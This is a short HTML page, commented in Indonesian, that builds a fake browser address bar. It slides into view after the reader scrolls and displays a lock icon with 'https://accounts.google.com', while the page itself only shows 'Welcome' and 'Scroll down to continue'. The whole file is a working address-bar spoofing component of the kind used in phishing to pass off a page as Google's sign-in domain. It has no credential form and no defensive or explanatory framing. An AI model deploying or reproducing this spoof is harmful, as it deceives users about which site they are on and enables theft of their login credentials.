<!DOCTYPE html>
<html>
<head>
<title>Loading...</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
    margin:0;
    font-family: Arial, sans-serif;
}

/* halaman panjang biar bisa scroll */
.spacer {
    height:1500px;
    background: linear-gradient(white, lightgray);
}

/* fake address bar */
#fakebar {
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:50px;
    background:#f1f3f4;
    border-bottom:1px solid #ccc;
    display:flex;
    align-items:center;
    padding:0 10px;
    font-size:14px;
    z-index:9999;
    transform:translateY(-100%);
    transition:0.3s;
}

/* tampil saat aktif */
#fakebar.show {
    transform:translateY(0);
}

.url {
    background:white;
    padding:6px 12px;
    border-radius:20px;
    border:1px solid #ccc;
    margin-left:10px;
    flex:1;
}
</style>

</head>

<body>

<div id="fakebar">
    🔒 <div class="url">https://accounts.google.com</div>
</div>

<div class="spacer"></div>

<div style="text-align:center; padding:40px;">
    <h2>Welcome</h2>
    <p>Scroll down to continue...</p>
</div>

<script>
let fakebar = document.getElementById("fakebar");

window.addEventListener("scroll", () => {
    if (window.scrollY > 200) {
        fakebar.classList.add("show");
    } else {
        fakebar.classList.remove("show");
    }
});
</script>

</body>
</html>
